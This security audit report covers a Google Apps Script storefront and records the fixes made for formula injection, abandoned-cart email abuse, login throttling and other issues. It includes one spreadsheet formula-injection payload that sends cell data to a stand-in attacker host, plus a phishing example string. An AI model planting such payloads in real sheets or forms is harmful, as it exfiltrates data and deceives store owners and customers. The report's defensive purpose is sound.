# Security Audit

Date: 2026-08-05
Scope: full repo — `apps-script/*.gs` (backend) and `assets/js/*.js` + every
`.html` page (frontend). Read-only findings, cross-checked against the actual
source (no assumptions carried over from earlier design docs).

The original pass **fixed only Critical findings** (§3a, §7's abandoned-cart
issue) and documented the rest for approval. All six remaining findings (3b,
3c, 3d, 6, 7's chat/view-counter gap, and the Low-severity comparison
finding) have since been approved and fixed in a follow-up pass — see
"What was fixed" at the bottom for the full list. Every finding on this
report is now closed.

## Severity legend

| Severity | Meaning |
|---|---|
| Critical | Exploitable by an anonymous/untrusted party today, with real damage (data exfiltration, phishing, abuse of the app's own identity) |
| High | Real risk, but needs specific conditions (a known username, a targeted victim) or has a meaningful mitigating factor |
| Medium | Real gap, limited blast radius (self-harm, cosmetic, resource abuse within a low ceiling) |
| Low / Informational | Theoretical or requires unrealistic effort to exploit |

---

## Summary table

| # | Category | Finding | Severity | Fixed? |
|---|---|---|---|---|
| 1 | Input validation | Google Sheets formula/CSV injection via unsanitized free text written to cells | **Critical** | ✅ Yes |
| 2 | Spam prevention | Abandoned-cart reminder email: arbitrary destination address + attacker-controlled body content | **Critical** | ✅ Yes |
| 3 | Rate limiting | No login attempt throttling — unlimited password guesses against a known username | High | ✅ Yes |
| 4 | Spam prevention | `sendMessage`/`sendChatImage` unauthenticated with no per-token throttle — inbox/Drive-storage flooding | Medium | ✅ Yes |
| 5 | Spam prevention | `recordProductViews`/`recordStoreVisit` unauthenticated, unthrottled — trending-rank gaming | Medium | ✅ Yes |
| 6 | Input validation | No length caps on free-text fields (product name/description, store name, order notes, customer name) | Medium | ✅ Yes |
| 7 | Input validation | `actionUpdateOwnerProfile` doesn't re-run registration's email-format/duplicate checks | **High** (elevated — password reset depends on this email) | ✅ Yes |
| 8 | Authentication | Session-token / username string comparisons are non-constant-time | Low | ✅ Yes |
| 9 | XSS, CSRF, Authorization, Vendor isolation, Customer isolation | No findings — see detail below | — | N/A |

---

## 1. XSS — Cross-Site Scripting

**Result: no exploitable findings.**

- Every card/list renderer that builds HTML via template literals runs
  user-controlled fields through `escapeHtml()` (`helpers.js`) before
  interpolating — verified in `product-card.js`, `directory.js`, `search.js`,
  `home.js`, `owner-products.js`, `owner-orders.js`, `owner-messages.js`,
  `checkout.js`, `cart-page.js`.
- Chat message bodies (`chat-window.js`, `owner-messages.js`) are rendered
  via `textContent`, not `innerHTML` — immune to markup injection regardless
  of content.
- Image `src` attributes are set via DOM property assignment
  (`img.src = value`), not string concatenation into `innerHTML` — even an
  attacker-controlled URL can't break out of the attribute this way, and
  `<img src="javascript:...">` doesn't execute in browsers.
- `variantId`/`price` interpolated unescaped into `product-card.js`
  (`<option value="${v.variantId}">`, `data-price="${v.price}"`) looked
  suspicious at first glance, but both are server-derived: `price` is always
  passed through `Number()` before being returned to the client (Products.gs
  lines 56/185/245/287), and `variantId` is always a server-generated
  `newId('var')` value, never client-chosen even when a vendor's own crafted
  API call tries to set one — confirmed in `actionCreateOrUpdateProduct`
  (Products.gs:363–388). Not exploitable.
- No inline event handlers (`onclick="..."` with interpolated data) anywhere
  in the 12 HTML pages.

## 2. CSRF — Cross-Site Request Forgery

**Result: not applicable by design.**

- There is no cookie-based session anywhere in the app (`grep`-confirmed: no
  `document.cookie`, `Set-Cookie`, or `withCredentials` in the repo). The
  owner session token lives only in `localStorage` and is explicitly read and
  attached to each request body by same-origin JS (`auth.js`'s
  `Auth.getToken()`). A forged cross-origin request has no way to read that
  token or reproduce it in a request body — the two standard CSRF
  preconditions (ambient credentials + predictable request shape) don't hold.
- `doGet` (Code.gs) only routes to read-only actions (`listStores`,
  `listProducts`, `getStorePublicInfo`, `searchProducts`, `listTopProducts`,
  `listTopStores`) — no state-changing action is reachable via a GET request,
  so there's no "CSRF via `<img src>`/simple link" vector either.

## 3. Input validation

### 3a. Google Sheets formula/CSV injection — **Critical, fixed**

`Db.gs`'s `appendRowFromObject`/`updateRowFromObject` write every field
verbatim into Sheet cells, with no sanitization. Google Sheets — like Excel —
interprets a cell value beginning with `=`, `+`, `-`, or `@` as a formula,
including via `Range.setValue()`/`setValues()` calls made from Apps Script,
not just manual typing. A formula can call `IMPORTXML`/`IMPORTDATA` to make
outbound HTTP requests (exfiltrating adjacent cell data to an attacker's
server) or `HYPERLINK(...)` to render a deceptive clickable link — and it
executes the moment the store owner or Sheet admin opens the tab and looks at
the row.

This is reachable by **any anonymous customer**, no auth required, through
several free-text fields that flow straight into a cell: checkout's
`customerName`/`notes`/`island`/`village` (Orders.gs `actionCreateOrder`),
chat's message body and customer name (Chat.gs), and — from a malicious
vendor — product name/description. Example payload as a checkout "Order
Notes" value: `=HYPERLINK("http://attacker.example/log?d="&A2,"Click for tracking info")`.

**Fix applied**: `Db.gs` now force-prefixes any string value that begins with
a formula-trigger character with a leading `'` before writing it — the same
mechanism Sheets uses internally to mark a cell as explicit plain text, so
the value still displays exactly as typed (the apostrophe is not part of the
stored/displayed value) but is never evaluated as a formula. Applied once, in
`appendRowFromObject`/`updateRowFromObject`, so it covers every current and
future write through the app's one data-access chokepoint with no per-call-site
changes needed.

### 3b. No login attempt throttling — High, **fixed**

`actionLoginOwner` (Auth.gs) had no lockout or delay after repeated failed
attempts against a known username. Fixed: 5 failures within a 15-minute
window now locks that username out for 30 minutes, tracked via
`CacheService` (Apps Script Web Apps expose no caller IP at all, so lockout
keys purely off the submitted username string — which locks out identically
whether or not that username maps to a real account, so this doesn't reopen
the enumeration issue the existing dummy-hash timing mitigation already
closed). Covers 2FA-enabled accounts automatically, since the check runs
before the 2FA branch. See `apps-script/Auth.gs`'s
`checkAndRecordLoginAttempt`.

### 3c. No length caps on free-text fields — Medium, **fixed**

Product name/description/category, store name, order notes/customer
name/island/village, and owner profile fields (Products.gs, Orders.gs,
Auth.gs) had no server-side maximum length (chat messages were the one
exception, already capped at 2000 chars). Fixed: a shared `capLength()`
helper (Utils.gs) now rejects — rather than silently truncates — any of
these fields over a per-field cap (100–2000 chars depending on the field;
see `apps-script/Utils.gs`'s `capLength` call sites). Chat's existing
truncate-not-reject behavior is deliberately left as a separate, unchanged
precedent.

### 3d. `actionUpdateOwnerProfile` skips registration's validation — elevated to High, **fixed**

`actionRegisterOwner` requires a non-blank, valid-format email and checks
for duplicate email across all owners. `actionUpdateOwnerProfile`
(Products.gs) previously wrote `body.email` straight through with none of
those checks — an owner could blank out their own contact email (silently
breaking the auto-email-to-vendor order flow) or set it to a value already
used by another store. **Elevated from Medium to High**: password reset
(`actionRequestPasswordReset`/`actionResetPasswordWithCode`) emails a
6-digit code to this exact address, so a blanked/broken email directly
defeats account recovery. Fixed via a shared `validateOwnerEmail()`
(Auth.gs) now used by both actions, plus `actionUpdateOwnerProfile` gaining
`LockService` locking it previously had none of (needed for the new
dedupe check-then-write to be race-safe).

## 4. Authentication

- Passwords: salted SHA-256 + a Script Properties pepper. Already documented
  in the README as a deliberate, accepted tradeoff (Apps Script has no
  bcrypt/argon2) — not re-litigated here.
- Session tokens: `Utilities.getUuid() + Utilities.getUuid()` — 244 bits of
  entropy, effectively unguessable. Expiry enforced server-side on every
  `requireAuth()` call (Auth.gs:66).
- Login username-enumeration: correctly mitigated — `actionLoginOwner` hashes
  the submitted password against a dummy salt when the username doesn't
  exist, so response timing/content doesn't reveal account existence.
  `actionRequestPasswordReset` has the same shape-preserving behavior.
- 2FA codes: 10-minute expiry, 5-attempt lockout, one-time (row deleted on
  success or final failure) — correctly implemented, shared consistently
  across login 2FA, 2FA setup, and password reset (Auth.gs `consumeTwoFACode`).
- Password reset revokes all of that owner's existing sessions
  (`revokeAllSessions`) — correct, limits damage from a credential-stuffing
  reset.
- Logout deletes the server-side Sessions row, not just the client copy.
- Login-attempt throttling — see 3b above, **fixed**.
- Low/informational, **fixed**: token and username comparisons previously
  used plain `===`, not a constant-time comparison. While not practically
  exploitable over Apps Script's own latency/execution-overhead floor, a new
  `constantTimeEquals()` (Utils.gs, modeled on Node's `crypto.timingSafeEqual`)
  is now used for the Sessions.Token lookup (via a new `findRowBySecret` in
  Db.gs, kept separate from the generic `findRowById` used by ~15+ non-secret
  id lookups), the TwoFACodes.Token lookup and code comparison, the password
  hash comparison, and (per explicit request, despite limited security value
  since usernames aren't secrets) the username match in `actionLoginOwner`.

## 5. Authorization

**Result: no findings — every protected action checked is correctly scoped.**

Every `PROTECTED_POST_ACTIONS` handler receives its `owner` argument
server-derived from `requireAuth(body.token)` in Code.gs — never from a
client-supplied `ownerId`/ID field. Verified individually:

- `actionUpdateOwnerProfile`, `actionGetOwnerProfile`, `actionListOwnerProducts`,
  `actionListOwnerOrders`, `actionSetStoreStatus`, `actionEnable2FARequest`,
  `actionConfirm2FASetup`, `actionDisable2FA`, `actionGetUnreadCount` — all
  operate exclusively on the authenticated owner's own row/scope, no ID
  parameter can redirect them to another owner's data.
- `actionDeleteProduct`, `actionCreateOrUpdateProduct` (Products.gs),
  `actionUpdateOrderStatus` (Orders.gs), `actionUploadProductImage`,
  `actionUploadStoreLogo` (Images.gs), `actionDeleteConversation`,
  `actionArchiveConversation` (Chat.gs) — all look up the target row by ID
  and explicitly check `existing.OwnerId !== owner.OwnerId` (or equivalent)
  before allowing the mutation, rejecting with a generic "not found" (not
  "forbidden" — correctly avoids confirming the row's existence to a vendor
  who doesn't own it).
- `resolveChatRequest`'s vendor path (Chat.gs) — the shared entry point for
  `sendMessage`/`getConversation`/`markAsRead`/`sendChatImage` — does the same
  ownership check before letting a vendor token touch a conversation.

## 6. Rate limiting

**Fixed for the two highest-value places identified below (login attempts,
chat sends, view/visit counters).** `LockService` is a concurrency guard
against double-writes, not a throttle by itself — the fix layers rate
counters on top of it, using `CacheService` (the same mechanism already
proven for the read-through cache) for all counter/lockout state. No new
Sheet tab, no new Script Property, no external dependency (no IP is ever
available to key on either way — Apps Script Web Apps don't expose caller
IP, confirmed by inspecting `doGet`/`doPost`).

- Login attempts — see 3b above: 5 failures/15min → 30min lockout, keyed by
  username.
- Chat sends (`sendMessage`/`sendChatImage`) — see §7 below: a two-tier
  burst (5/10s) + sustained (30/60s) limiter runs centrally in `Code.gs`'s
  `doPost`, before action dispatch — the closest thing this router has to
  middleware, mirroring how `PROTECTED_POST_ACTIONS` already centrally gates
  on `requireAuth`. Keyed by session token (vendor) or `customerToken`
  (anonymous customer).
- View/visit counters (`recordProductViews`/`recordStoreVisit`) — see §7
  below: a global 5-minute per-item cooldown, not a per-caller limit (no
  caller identity exists for these at all, and a fresh client-generated ID
  would offer no real abuse-resistance in an unauthenticated context anyway).

**Accepted residual limitation, stated explicitly rather than left
implicit**: none of this is full abuse-resistance against a determined
attacker — a `customerToken` is client-generated and trivially reset by
clearing `localStorage`, and there's still no way to distinguish "one
attacker with many identities" from "many real visitors." These limiters are
a backstop against naive/accidental flooding (a stuck retry loop, a simple
script), which is what this platform's constraints make achievable without
external infrastructure.

## 7. Spam prevention

- **Abandoned-cart reminder email abuse — Critical, fixed.** See below.
- **`sendMessage`/`sendChatImage` — Medium, fixed.** See §6 above for the
  rate-limiting design. `getConversation`/`markAsRead` (read-only) are
  intentionally not rate-limited — already bounded by the existing 6–10s
  polling interval design.
- **`recordProductViews`/`recordStoreVisit` — Medium, fixed.** See §6 above.

### Abandoned-cart reminder email — Critical, fixed

`actionSaveAbandonedCart` (Reminders.gs) is public, unauthenticated, and
accepts an arbitrary `email` with no verification it belongs to the
requester, plus an arbitrary `items` array that was stored and later
replayed **verbatim** into the reminder email's body by `runReminderSweep` —
including each item's client-supplied `label` field, with no validation that
it corresponds to a real product.

Combined, this let anyone — with a single unauthenticated POST — make the
app send an email, from the store's own configured identity/sending quota,
to **any address they choose**, containing **attacker-chosen text** embedded
in the item list (e.g. a phishing line: `label: "URGENT - confirm payment at http://evil.example"`).
This is a spam-relay / phishing-content-injection primitive riding on a
legitimate store's name and Apps Script mail quota — clearly Critical:
trivially exploitable, no auth, real-world abuse value (spam relay, phishing,
reputational damage to the impersonated store).

**Fix applied**: `actionSaveAbandonedCart` now stores only
`{productId, variantId, qty}` per item — the client-supplied `label` is
dropped entirely, never persisted. `runReminderSweep` now re-derives each
item's display name from the live Products/Variants sheets by `productId`
(the same "never trust client text that gets echoed elsewhere" pattern
`actionCreateOrder` already uses for order confirmations), falling back to a
generic "an item" only if the product has since been deleted. The email can
still be sent to an arbitrary address with no ownership check on the email
itself — that residual risk is the same one described in section 6 (needs a
rate-limiting/anti-abuse design decision) and is called out again here for
visibility, not silently left out of scope.

## 8. Vendor isolation

**Result: no findings.** Covered in detail under Authorization (section 5) —
every action that reads or mutates a vendor-owned resource re-derives the
acting owner from the server-side token and checks row-level `OwnerId`
ownership before proceeding. No action accepts a client-supplied `ownerId`
that could redirect it to another vendor's data.

## 9. Customer isolation

**Result: no findings.**

- Cart data is pure `localStorage`, inherently scoped to one browser —
  no server round-trip, no cross-customer path at all.
- Chat identity (`customerToken`) is a `crypto.randomUUID()` — 122 bits of
  entropy, not practically guessable/enumerable — and every chat action
  matches strictly on `(storeSlug, customerToken)`, so one customer can't
  reach another's conversation without their token.
- There is no "look up an order by ID" endpoint reachable by a customer —
  `actionCreateOrder` is the only public order-touching action, and it only
  ever returns the order the caller just created, in that same response. A
  customer can't enumerate or view any other customer's order.

---

## What was fixed

**Original pass (Critical only):**

1. **`apps-script/Db.gs`** — `appendRowFromObject`/`updateRowFromObject` now
   sanitize every outgoing string value against Sheets formula injection
   (leading `'` prefix on any value starting with `=`, `+`, `-`, or `@`).
   This is a single, low-risk chokepoint fix: legitimate values are
   unaffected (displayed cell content is identical), and it also incidentally
   fixes today's existing behavior where a phone number starting with `+`
   could already be silently mis-parsed by Sheets' own auto-formula-detection.
2. **`apps-script/Reminders.gs`** — abandoned-cart items no longer trust a
   client-supplied display label; `runReminderSweep` re-derives real product
   names from Products/Variants before building the reminder email.

**Follow-up pass (approved, all remaining findings, in priority order):**

3. **Fix 1 — login-attempt throttling** (`apps-script/Auth.gs`). See 3b.
4. **Fix 2 — email validation/dedup on profile update** (`apps-script/Auth.gs`,
   `apps-script/Products.gs`). See 3d. Elevated to High mid-audit since
   password reset depends on this exact email.
5. **Fix 3 — rate limiting** on chat sends (`apps-script/Code.gs`,
   `apps-script/Chat.gs` call sites) and view/visit counters
   (`apps-script/Products.gs`). See §6/§7. Small companion frontend fix:
   `assets/js/chat-window.js` and `assets/js/owner-messages.js` now surface
   the real server error on a failed text-message send/reply, not a generic
   "Failed to send" — relevant now that a rate-limited send is a real path
   a user can hit.
6. **Fix 4 — length caps** on free-text fields (`apps-script/Utils.gs`'s
   `capLength`, applied across `Auth.gs`/`Products.gs`/`Orders.gs`). See 3c.
7. **Fix 5 — constant-time comparison** for session tokens, 2FA codes, and
   password hashes (`apps-script/Utils.gs`'s `constantTimeEquals`,
   `apps-script/Db.gs`'s `findRowBySecret`, applied in `apps-script/Auth.gs`).
   See §4's comparison finding.

Each of the five follow-up fixes was implemented, covered by new tests, and
verified against a full regression run before moving to the next — the
harness-based suite (kept outside the repo) now has 137 tests, all passing.

No finding in this report required a new Sheet tab, a new Script Property,
or an external dependency (Redis or otherwise) — every fix uses either the
existing `CacheService` (already proven for the read-through cache layer)
or plain in-request validation.

## What's next

Nothing outstanding from this audit. Future changes to free-text fields,
new public actions, or new fields that get emailed/rendered elsewhere should
follow the same patterns this pass established: run new Sheet writes through
the existing sanitization chokepoint (automatic, no per-call-site action
needed), cap new free-text fields via `capLength`, and rate-limit any new
unauthenticated write action the same way `checkChatRateLimit`/the view-count
cooldown do.
